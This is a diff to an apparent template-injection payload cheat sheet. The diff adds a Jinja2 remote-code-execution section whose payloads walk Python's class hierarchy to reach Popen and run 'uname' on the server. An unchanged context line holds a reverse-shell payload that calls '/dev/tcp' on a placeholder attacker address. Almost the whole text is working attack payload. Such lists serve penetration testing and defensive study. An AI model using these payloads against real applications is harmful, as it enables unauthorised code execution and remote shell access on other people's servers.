@@ -205,6 +205,14 @@ Inject this template
 {{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
 ```
 
+### Jinja2 - Remote Code Execution via Popen
+
+```python
+{{''.__class__.mro()[2].__subclasses__()}}
+{{''.__class__.mro()[2].__subclasses__()[233](["uname"])}}
+{{''.__class__.mro()[2].__subclasses__()[233]("uname -a",shell=True,stdout=-1).communicate()[0]}}
+```
+
 ## Client Side Template Injection
 
 ### AngularJS
